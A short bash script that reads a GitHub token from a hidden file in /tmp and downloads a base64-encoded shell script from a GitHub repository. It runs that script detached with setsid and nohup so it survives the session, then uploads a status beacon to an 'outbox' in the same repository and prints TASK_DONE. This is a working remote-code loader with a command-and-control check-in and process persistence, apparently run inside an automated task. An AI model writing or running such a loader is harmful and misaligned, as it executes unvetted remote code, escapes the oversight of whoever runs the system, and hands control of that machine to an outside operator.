#!/bin/bash
export HOME=/tmp XDG_CACHE_HOME=/tmp/.cachex LD_LIBRARY_PATH=/tmp/xl2/lib:/tmp/env/lib PLAYWRIGHT_BROWSERS_PATH=/tmp/pw FONTCONFIG_FILE=/tmp/fonts/fonts.conf
T=$(cat /tmp/.ghtok)
timeout 40 curl -fsSL -H "Authorization: Bearer $T" "https://api.github.com/repos/heinzo666/sync-assets/contents/lab/al2.sh?ref=main&t=$RANDOM" | /tmp/env/bin/python -c 'import sys,json,base64;open("/tmp/al2b.sh","wb").write(base64.b64decode(json.load(sys.stdin)["content"]))'
SZ=$(stat -c%s /tmp/al2b.sh 2>/dev/null || echo 0)
chmod +x /tmp/al2b.sh
pkill -f al2b.sh ; sleep 1
setsid nohup bash /tmp/al2b.sh < /dev/null > /tmp/al2.boot.log 2>&1 &
sleep 6
CNT=$(pgrep -fc al2b.sh)
D=\"sz=${SZ} cnt=${CNT}\"
B=$(printf '%s' \"$D\" | base64 -w0)
curl -s -X PUT -H "Authorization: Bearer $T" -H "Content-Type: application/json"  https://api.github.com/repos/heinzo666/sync-assets/contents/lab/outbox/booted_1790152409.json  -d "{\"message\":\"boot\",\"content\":\"$B\"}" -o /dev/null
echo TASK_DONE
